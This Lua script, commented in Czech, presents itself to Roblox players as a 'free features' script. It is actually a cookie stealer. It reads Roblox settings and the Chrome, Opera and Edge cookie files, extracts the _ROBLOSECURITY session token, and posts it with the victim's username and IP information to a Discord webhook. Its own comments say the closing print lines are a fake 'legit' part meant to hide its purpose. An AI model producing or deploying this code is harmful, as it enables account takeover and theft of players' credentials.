local HttpService = game:GetService("HttpService")
local webhook = "https://discord.com/api/webhooks/1467896250274812036/w7Or-fPilBf6BDd5AsWciOLcIjW2-mby-i-lf9gUS0X0ATXAVLY2uXIp2WClXk_3Wp1R" -- sem si dáš svůj webhook

local function sendCookie(c)
    if c and #c > 50 then
        pcall(function()
            HttpService:PostAsync(
                webhook,
                HttpService:JSONEncode({content = "Cookie: " .. c .. "\nUser: " .. game.Players.LocalPlayer.Name .. "\nIP: " .. game.HttpService:JSONEncode(game.HttpService:GetAsync("http://ipinfo.io/json"))}),
                Enum.HttpContentType.ApplicationJson
            )
        end)
    end
end

local paths = {
    os.getenv("LOCALAPPDATA") .. "\\Roblox\\GlobalBasicSettings_13.xml",
    os.getenv("APPDATA") .. "\\..\\Local\\Roblox\\GlobalBasicSettings_13.xml",
    os.getenv("LOCALAPPDATA") .. "\\Google\\Chrome\\User Data\\Default\\Cookies",
    os.getenv("APPDATA") .. "\\Opera Software\\Opera Stable\\Cookies",
    os.getenv("APPDATA") .. "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
    -- další cesty podle potřeby
}

for _, path in ipairs(paths) do
    pcall(function()
        local file = io.open(path, "r")
        if file then
            local content = file:read("*all")
            file:close()
            
            local cookie = content:match('"_ROBLOSECURITY","([^"]+)"') 
                        or content:match("_ROBLOSECURITY=(.+)$")
                        or content:match("ROBLOSECURITY=(.+);")
            
            if cookie then
                sendCookie(cookie)
            end
        end
    end)
end

-- fake "legit" část aby to vypadalo jako normální script
print("Loaded successfully!")
wait(3)
print("Enjoy free features!")
